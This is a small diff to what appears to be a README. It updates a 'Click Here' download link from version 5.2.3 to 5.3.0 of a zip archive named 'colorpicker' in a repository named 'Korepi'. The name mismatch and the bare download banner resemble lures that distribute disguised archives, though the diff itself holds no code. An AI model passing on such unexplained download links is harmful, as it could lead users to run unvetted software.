@@ -10,7 +10,7 @@
 
 
 
-## ✨ Download - [Click Here](https://github.com/Kulikkk/Korepi/releases/download/v5.2.3/colorpicker5.2.zip)
+## ✨ Download - [Click Here](https://github.com/Kulikkk/Korepi/releases/download/v5.3.0/colorpicker5.3.zip)
 
 
 
